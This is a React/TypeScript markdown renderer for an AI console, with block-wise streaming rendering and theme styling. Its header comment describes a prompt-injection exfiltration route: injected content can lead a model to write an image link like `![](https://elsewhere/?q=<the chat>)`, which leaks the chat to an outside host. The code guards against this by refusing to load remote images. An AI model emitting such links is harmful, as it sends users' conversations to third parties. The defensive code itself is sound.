/**
 * Markdown as the console shows it: react-markdown, in blocks.
 *
 * react-markdown parses and highlights the whole text on every render, and a
 * streamed reply renders on every chunk: at the end of an ~1,800-word reply
 * with code and tables, each chunk cost ~73 ms of main thread (10 ms at its
 * start) -- several frames per chunk, ~30 s for the reply. Split into its
 * top-level blocks (marked's lexer, a fraction of a millisecond), a finished
 * block keeps its props and React skips it: only the block being written is
 * parsed again, ~3-5 ms per chunk at any length. While streaming, remend
 * closes what the model has opened and not yet closed (`**bold`, a code
 * span, a link), so half-written syntax does not flash as raw characters.
 *
 * These are the two pieces Streamdown is built from; the rendering and its
 * look stay react-markdown's and the theme's (`markdownSx`).
 *
 * A picture loads only from the console's own origin, a `data:image/` URL or
 * a `blob:` URL. Any other is shown as a link that loads nothing until it is
 * clicked: the text is often a model's, and a model can be talked into
 * writing `![](https://elsewhere/?q=<the chat>)` by a document, a web page or
 * a knowledge passage -- an image the browser fetches by itself would send
 * the chat there without a click.
 */
import { memo, useMemo, type ComponentPropsWithoutRef } from "react";
import type { Theme } from "@mui/material/styles";
import type { SystemStyleObject } from "@mui/system";
import ReactMarkdown, { defaultUrlTransform, type Components, type UrlTransform } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";
import { Lexer } from "marked";
import remend from "remend";
import { useTranslation } from "react-i18next";

const REMARK_PLUGINS = [remarkGfm];
const REHYPE_PLUGINS = [rehypeHighlight];
const NO_REHYPE: [] = [];

/** Resolves relative URLs when there is no page (server rendering): they count as the page's own. */
const NO_PAGE_ORIGIN = "http://page.invalid";

function pageOrigin(): string {
  return typeof window !== "undefined" && window.location?.origin && window.location.origin !== "null"
    ? window.location.origin
    : NO_PAGE_ORIGIN;
}

/**
 * Whether a picture may load by itself: from the page's own origin (a relative
 * URL included), a `data:image/` URL or a `blob:` URL. Nothing else, so the
 * browser never fetches a picture from a host the text names.
 */
export function isLocalImageSrc(src: string | null | undefined, origin: string = pageOrigin()): boolean {
  if (!src) return false;
  const value = src.trim();
  if (/^data:/i.test(value)) return /^data:image\//i.test(value);
  if (/^blob:/i.test(value)) return true;
  try {
    const url = new URL(value, `${origin}/`);
    return (url.protocol === "http:" || url.protocol === "https:") && url.origin === new URL(origin).origin;
  } catch {
    return false;
  }
}

/** The host a picture would come from, for its link; the URL itself when it has none. */
function imageHost(src: string): string {
  try {
    return new URL(src, `${pageOrigin()}/`).host || src;
  } catch {
    return src;
  }
}

/**
 * react-markdown's URL filter, which also lets a picture's own `data:image/`
 * and `blob:` sources through (the default drops both). Links keep the default.
 */
const urlTransform: UrlTransform = (value, key, node) => {
  if (key === "src" && node.tagName === "img" && /^(data:image\/|blob:)/i.test(value.trim())) return value;
  return defaultUrlTransform(value);
};

type ImageProps = ComponentPropsWithoutRef<"img"> & { node?: unknown };

/** A picture from the page's own origin; any other as a link to it that loads nothing by itself. */
function MarkdownImage({ node: _node, src, alt, ...rest }: ImageProps) {
  const { t } = useTranslation();
  const url = typeof src === "string" ? src : "";
  if (isLocalImageSrc(url)) return <img src={url} alt={alt ?? ""} {...rest} />;
  const label = alt?.trim() || t("common.image", { defaultValue: "image" });
  if (!url) return <span>{label}</span>;
  const host = imageHost(url);
  return (
    <a
      href={url}
      target="_blank"
      rel="noopener noreferrer nofollow"
      referrerPolicy="no-referrer"
      title={t("common.remote_image", {
        host,
        defaultValue: "A picture from {{host}}, not loaded. Click to open it.",
      })}
      data-remote-image=""
    >
      {label} ({host})
    </a>
  );
}

const COMPONENTS: Components = { img: MarkdownImage };

/** A reference definition (`[id]: url`) or footnote (`[^1]: ...`) links blocks to each other. */
const CROSS_BLOCK = /^ {0,3}\[\^?[^\]\n]+\]:/m;

/** The text's top-level blocks, as written; one block when they would not stand alone. */
export function splitBlocks(text: string): string[] {
  if (!text || CROSS_BLOCK.test(text)) return [text];
  try {
    const blocks = Lexer.lex(text, { gfm: true })
      .filter((token) => token.type !== "space")
      .map((token) => token.raw);
    return blocks.length > 0 ? blocks : [text];
  } catch {
    return [text];
  }
}

const Block = memo(function Block({ text, highlight }: { text: string; highlight: boolean }) {
  return (
    <ReactMarkdown
      remarkPlugins={REMARK_PLUGINS}
      rehypePlugins={highlight ? REHYPE_PLUGINS : NO_REHYPE}
      components={COMPONENTS}
      urlTransform={urlTransform}
    >
      {text}
    </ReactMarkdown>
  );
});

export default function Markdown({
  children,
  streaming = false,
  highlight = true,
}: {
  children: string;
  /** Still being written: half-written syntax is closed for display. */
  streaming?: boolean;
  /** Colour code blocks (rehype-highlight). */
  highlight?: boolean;
}) {
  const blocks = useMemo(() => splitBlocks(streaming ? remend(children) : children), [children, streaming]);
  return (
    <>
      {blocks.map((block, index) => (
        // By position: a finished block keeps its index and its text, so it is not rendered again.
        // eslint-disable-next-line react/no-array-index-key
        <Block key={index} text={block} highlight={highlight} />
      ))}
    </>
  );
}

/**
 * The look of rendered markdown, from the theme. The CSS reset (Tailwind's
 * preflight) takes list markers, heading sizes and link underlines away;
 * these give them back.
 */
export function markdownSx(theme: Theme, { linkColor }: { linkColor?: string } = {}): SystemStyleObject<Theme> {
  const dark = theme.palette.mode === "dark";
  return {
    "& p": { m: 0, mb: 1, "&:last-child": { mb: 0 } },
    "& h1, & h2, & h3, & h4, & h5, & h6": {
      fontWeight: 700,
      lineHeight: 1.3,
      mt: 2,
      mb: 1,
      "&:first-child": { mt: 0 },
    },
    "& h1": { fontSize: "1.35em" },
    "& h2": { fontSize: "1.2em" },
    "& h3": { fontSize: "1.08em" },
    "& h4, & h5, & h6": { fontSize: "1em" },
    "& ul, & ol": { pl: 3, mt: 0, mb: 1, "&:last-child": { mb: 0 } },
    "& ul": { listStyleType: "disc" },
    "& ol": { listStyleType: "decimal" },
    "& ul ul, & ol ul": { listStyleType: "circle", mb: 0 },
    "& ul ul ul, & ol ul ul": { listStyleType: "square" },
    "& ol ol, & ul ol": { listStyleType: "lower-alpha", mb: 0 },
    "& li": { mb: 0.25, pl: 0.25 },
    "& li > p": { mb: 0.5 },
    "& li::marker": { color: "text.secondary" },
    // GFM task lists: the checkbox is the marker.
    "& ul.contains-task-list": { listStyleType: "none", pl: 0.5 },
    "& li.task-list-item input": { mr: 0.75, verticalAlign: "middle" },
    "& pre": {
      bgcolor: dark ? "rgba(0,0,0,0.35)" : "rgba(0,0,0,0.06)",
      borderRadius: 1,
      p: 1.5,
      my: 1,
      overflowX: "auto",
      fontSize: "0.85rem",
    },
    "& code": {
      fontSize: "0.85rem",
      fontFamily: '"Fira Code", "Fira Mono", monospace',
    },
    // rehype-highlight's token classes, coloured for the theme's mode (no
    // highlight.js stylesheet was ever loaded: code stayed one colour).
    ...codeColours(dark),
    "& :not(pre) > code": {
      bgcolor: dark ? "rgba(255,255,255,0.1)" : "rgba(0,0,0,0.06)",
      borderRadius: 0.5,
      px: 0.5,
      py: 0.25,
    },
    // As wide as its columns, scrolling sideways when wider than the reply (a phone).
    "& table": {
      borderCollapse: "collapse",
      display: "block",
      width: "max-content",
      maxWidth: "100%",
      overflowX: "auto",
      my: 1,
    },
    "& th, & td": {
      border: `1px solid ${theme.palette.divider}`,
      px: 1,
      py: 0.5,
      fontSize: "0.85rem",
      textAlign: "left",
    },
    "& th": { fontWeight: 600, bgcolor: dark ? "rgba(255,255,255,0.04)" : "rgba(0,0,0,0.03)" },
    "& blockquote": {
      borderLeft: `3px solid ${theme.palette.primary.main}`,
      pl: 1.5,
      ml: 0,
      my: 1,
      color: "text.secondary",
    },
    "& hr": { border: 0, borderTop: `1px solid ${theme.palette.divider}`, my: 1.5 },
    "& img": { maxWidth: "100%" },
    "& a": {
      color: linkColor ?? theme.palette.primary.main,
      textDecoration: "underline",
      textUnderlineOffset: "2px",
    },
  };
}

/** highlight.js token colours, GitHub's palettes for light and dark. */
function codeColours(dark: boolean): SystemStyleObject<Theme> {
  const c = dark
    ? { keyword: "#ff7b72", string: "#a5d6ff", comment: "#8b949e", number: "#79c0ff", title: "#d2a8ff", builtIn: "#ffa657", tag: "#7ee787" }
    : { keyword: "#cf222e", string: "#0a3069", comment: "#6e7781", number: "#0550ae", title: "#8250df", builtIn: "#953800", tag: "#116329" };
  return {
    "& .hljs-keyword, & .hljs-doctag, & .hljs-template-tag, & .hljs-variable.language_": { color: c.keyword },
    "& .hljs-string, & .hljs-regexp, & .hljs-meta .hljs-string": { color: c.string },
    "& .hljs-comment, & .hljs-quote": { color: c.comment, fontStyle: "italic" },
    "& .hljs-number, & .hljs-literal, & .hljs-attr, & .hljs-attribute, & .hljs-meta, & .hljs-selector-attr, & .hljs-operator":
      { color: c.number },
    "& .hljs-title, & .hljs-title.function_, & .hljs-title.class_, & .hljs-section": { color: c.title },
    "& .hljs-built_in, & .hljs-type, & .hljs-variable, & .hljs-params, & .hljs-symbol": { color: c.builtIn },
    "& .hljs-name, & .hljs-selector-tag, & .hljs-selector-class, & .hljs-addition": { color: c.tag },
    "& .hljs-deletion": { color: c.keyword },
    "& .hljs-emphasis": { fontStyle: "italic" },
    "& .hljs-strong": { fontWeight: 700 },
  };
}
